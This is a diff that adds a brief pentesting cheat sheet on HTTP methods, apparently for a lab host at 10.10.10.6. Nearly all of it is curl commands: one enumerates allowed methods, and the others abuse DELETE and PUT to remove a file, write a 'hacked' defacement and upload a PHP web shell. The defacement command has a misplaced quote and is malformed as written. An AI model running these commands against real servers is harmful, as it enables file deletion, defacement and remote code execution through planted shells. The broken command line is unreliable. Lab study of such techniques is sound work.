@@ -1,0 +1,16 @@
+HTTP METHODS
+GET
+POST
+OPTIONS
+DELETE
+PUT
+
+Display all methods permitted on a website 
+curl -v -X OPTIONS http://10.10.10.6/ve
+
+curl -X DELETE http://10.10.10.6/1.txt
+
+curl -X PUT -d 'hacked 'http://10.10.10.6/shell.txt
+
+curl -X PUT --upload-file shell.php http://10.10.10.6/shell.php
+
